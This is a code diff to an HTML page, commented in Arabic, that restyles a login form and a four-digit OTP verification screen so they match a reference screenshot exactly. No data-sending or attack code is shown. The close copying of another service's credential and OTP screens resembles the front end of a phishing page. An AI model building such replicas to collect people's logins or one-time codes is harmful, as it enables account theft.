@@ -219,14 +219,14 @@
             font-weight: 500;
         }
 
-        /* تخصيصات واجهة OTP الثانية */
+        /* تخصيصات واجهة OTP الثانية المحدثة تماماً لتطابق image_12.png */
         .otp-title {
-            font-size: 1.1rem;
-            font-weight: bold;
-            color: #000;
+            font-size: 1.05rem;
+            font-weight: normal;
+            color: #666;
             text-align: center;
-            line-height: 1.6;
-            margin-top: 15px;
+            line-height: 1.7;
+            margin-top: 40px;
             margin-bottom: 40px;
         }
 
@@ -234,56 +234,45 @@
             display: flex;
             justify-content: center;
             width: 100%;
-            margin-bottom: 35px;
+            margin-bottom: 40px;
         }
 
+        /* توزيع أشرطة حقل الـ otp الأربعة النظيفة بدون صناديق أو انحناءات */
         .otp-container {
             display: flex;
-            gap: 20px;
+            gap: 15px;
             direction: ltr !important;
         }
 
         .otp-field {
-            width: 32px;
-            height: 40px;
+            width: 28px;
+            height: 30px;
             border: none;
-            border-bottom: 2px solid #222;
-            font-size: 1.5rem;
+            border-bottom: 2px solid #222; /* إبقاء الخط السفلي فقط كشريط أفقي نظيف */
+            font-size: 1.4rem;
             font-weight: bold;
             outline: none;
             background: transparent;
             direction: ltr !important;
-            text-align: left !important;
+            text-align: center !important;
             unicode-bidi: plaintext !important;
             caret-color: transparent !important; 
             pointer-events: auto;
             user-select: none !important;
+            border-radius: 0 !important; /* التأكد من إزالة أي انحناء */
         }
         
         .otp-field::selection {
             background: transparent !important;
         }
 
-        .otp-timer-label {
-            font-size: 0.95rem;
-            color: #666;
-            margin-bottom: 5px;
-            margin-top: 10px;
-        }
-
         .otp-timer-countdown {
-            font-size: 1.1rem;
+            font-size: 1.2rem;
             font-weight: bold;
-            color: var(--primary-teal);
+            color: #0c3e66; /* لون المؤقت الغامق المتناسق مع الواجهة الجديدة */
             margin-bottom: 25px;
-        }
-
-        .green-circle {
-            width: 32px;
-            height: 32px;
-            border: 4px solid #00ff00;
-            border-radius: 50%;
-            margin-bottom: 30px;
+            text-align: center;
+            margin-top: 10px;
         }
 
         /* الزر السفلي الأصفر الثابت */
@@ -327,7 +316,6 @@
                 <label>اسم المستخدم أو رقم الهاتف</label>
                 <div class="input-wrapper">
                     <input type="text" id="usernameInput" class="main-input" maxlength="8" placeholder="من 8 أرقام" oninput="cleanNumberInput(this)">
-                    <!-- أيقونة مستخدم دائرية كاملة متطابقة تماماً مع الصورة المرفقة الجديدة -->
                     <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <circle cx="12" cy="12" r="10"/>
                         <path d="M18 19c0-2.21-2.69-4-6-4s-6 1.79-6 4"/>
@@ -339,7 +327,6 @@
             <div class="input-group" style="margin-bottom: 5px;">
                 <label>الرقم السري</label>
                 <div class="input-wrapper">
-                    <!-- أيقونة قفل مفتوح عريض متطابقة مئة بالمئة مع الصورة المرفقة الجديدة -->
                     <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                         <path d="M7 11V7a5 5 0 0 1 9.9-1"/>
@@ -365,8 +352,9 @@
             </div>
         </div>
 
+        <!-- واجهة الـ OTP المنظمة والمطابقة تماماً لـ image_12.png (بدون دوائر أو صناديق) -->
         <div id="otpSection" class="app-content hidden">
-            <p class="otp-title">أدخل رمز التأكيد المرسل إلى<br>هاتفك المحمول</p>
+            <p class="otp-title">أدخل رمز التأكيد المرسل إلى هاتف المحمول</p>
 
             <div class="otp-wrapper-box">
                 <div class="otp-container">
@@ -377,13 +365,10 @@
                 </div>
             </div>
 
-            <p class="otp-timer-label">تنتهي صلاحية رمز التأكيد خلال</p>
-            <p class="otp-timer-countdown">4 دقائق 58 ثواني</p>
+            <p class="otp-timer-countdown">04:58 ثواني</p>
 
-            <div class="green-circle"></div>
-
-            <div class="register-link-box" style="margin-top: 0; margin-bottom: 10px;">
-                <a href="#" style="color: #444; font-weight: normal;">إعادة إرسال رمز التأكيد</a>
+            <div class="register-link-box" style="margin-top: auto; margin-bottom: 20px;">
+                <a href="#" style="color: #222; font-weight: 500;">إعادة إرسال رمز التأكيد</a>
             </div>
         </div>
 
@@ -428,7 +413,7 @@
             field.addEventListener('drop', (e) => e.preventDefault());
         });
 
-        // حركة التنقل لحقول رمز التحقق OTP
+        // حركة التنقل لحقول رمز التحقق OTP الأربعة النظيفة
         function handleOtpNavigation(current, currentIndex) {
             current.value = current.value.replace(/[^0-9]/g, '');
             const fields = document.querySelectorAll('.otp-field');
